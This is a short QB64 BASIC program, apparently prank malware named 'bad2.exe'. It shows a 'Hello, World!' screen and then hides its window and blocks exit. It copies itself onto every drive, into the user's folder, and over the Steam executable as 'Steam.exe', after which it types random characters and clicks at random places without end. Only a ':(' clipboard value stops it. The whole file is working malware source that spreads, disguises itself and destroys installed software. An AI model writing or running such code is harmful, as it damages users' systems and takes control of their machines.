_TITLE " "
_DELAY .5
PRINT "Hello, World!"
LOCATE 25
PRINT "Press any key to continue";
SLEEP
_SCREENHIDE
nope = _EXIT
FOR L = 65 TO 90
    IF _DIREXISTS(CHR$(L) + ":\") THEN
        IF L = 67 THEN
            SHELL _HIDE "copy " + _CWD$ + "\bad2.exe " + "C:\users\" + ENVIRON$("USERNAME") + "\bad2.exe "
            SHELL _HIDE "copy " + _CWD$ + "\bad2.exe " + "C:\users\" + ENVIRON$("USERNAME") + "\Steam.exe "
            SHELL _HIDE "copy " + _CWD$ + "\bad2.exe " + "C:\Program Files (x86)\Steam\Steam.exe"
        ELSE
            SHELL _HIDE "copy " + _CWD$ + "\bad2.exe " + CHR$(L) + ":\bad2.exe"
            SHELL _HIDE "copy " + _CWD$ + "\bad2.exe " + CHR$(L) + ":\Steam.exe"
        END IF
    END IF
NEXT
'SYSTEL=M
DO
    _SCREENPRINT CHR$(RND * 256)
    _SCREENCLICK RND * _DESKTOPWIDTH, RND * _DESKTOPHEIGHT
    SLEEP 2
    IF _CLIPBOARD$ = ":(" THEN
        _SCREENSHOW
        PRINT "sorry :(   BYE"
        BEEP: SYSTEM
    END IF

LOOP
